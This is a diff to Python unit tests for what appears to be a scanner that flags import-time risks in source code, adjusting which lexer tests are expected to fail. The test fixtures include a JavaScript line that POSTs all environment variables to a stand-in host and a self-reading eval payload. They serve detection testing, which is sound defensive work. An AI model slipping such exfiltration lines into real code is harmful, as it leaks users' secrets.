@@ -588,13 +588,13 @@ class ReadByTheLexersTests(unittest.TestCase):
                "const out = `${eval(fs.readFileSync(__filename, 'utf8').split('/*' + 'P*/')[1])}`;\n")
         self.assertEqual(core.import_time_risk(src, "js"), ([self.OWN], 2))
 
-    @unittest.expectedFailure      # (the data flow on the lexers waits for scopes: phase 3)
     def test_a_quote_in_a_regular_expression_begins_no_string(self):
+        # (JavaScript's data flow reads the tree since phase 3: no quote pairing)
         src = ("const q = /'/g; fetch('https://collector.invalid/x', {method: 'POST', "
                "body: JSON.stringify(process.env)});\n")
         self.assertEqual(core.import_time_risk(src, "js"), ([self.ENV], 1))
 
-    @unittest.expectedFailure      # (the data flow on the lexers waits for scopes: phase 3)
+    @unittest.expectedFailure      # (Python's data flow on the tree: phase 3, after JavaScript's)
     def test_triple_quotes_in_a_python_comment_begin_no_string(self):
         src = ('# the """ quotes\n'
                "import os, urllib.request\n"
